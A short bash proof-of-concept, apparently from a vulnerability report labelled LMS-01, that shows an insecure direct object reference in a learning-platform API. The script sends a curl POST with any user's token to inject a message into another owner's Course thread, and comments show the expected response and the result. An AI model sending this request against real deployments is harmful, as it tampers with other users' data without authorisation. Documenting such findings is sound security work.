#!/usr/bin/env bash
# LMS-01 - IDOR write prong: any authenticated user injects a message into any
# Course/Lesson/User thread; it is persisted and rendered to the resource owner.

curl -s -X POST \
     -H "Authorization: Bearer <ANY_VALID_USER_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"type":"Course","resource":"1","message":"ATTACKER-INJECTED-MSG"}' \
     "<BASE_URL>/api/message"
# -> 200 JSON echo of the persisted row (messageable App\Entities\Course id=1, user_id=<attacker>)
# Owner's next legitimate GET /api/message?type=Course&resource=1 now renders the injected message.
